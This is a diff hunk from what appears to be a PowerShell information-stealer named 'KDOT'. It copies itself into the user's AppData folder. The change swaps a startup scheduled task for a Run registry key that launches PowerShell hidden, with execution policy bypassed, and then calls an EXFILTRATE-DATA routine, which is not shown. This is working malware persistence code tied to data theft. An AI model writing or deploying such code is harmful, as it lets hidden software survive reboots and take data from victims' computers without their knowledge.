@@ -191,14 +191,10 @@ function TASKS {
         $origin = $PSCommandPath
         Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1"
     }
-    $test = Get-ScheduledTask | Select-Object -ExpandProperty TaskName
-    if ($test -contains "KDOT") {
-        Write-Host "KDOT already exists"
-    } else {
-        $schedule = New-ScheduledTaskTrigger -AtStartup
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1"
-        Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Limited -Force
-    }
+    $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1"
+    $command = "powershell.exe -NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File `"$scriptPath`""
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    New-ItemProperty -Path $regPath -Name "KDOT" -Value $command -PropertyType String -Force | Out-Null
     EXFILTRATE-DATA
 }
 
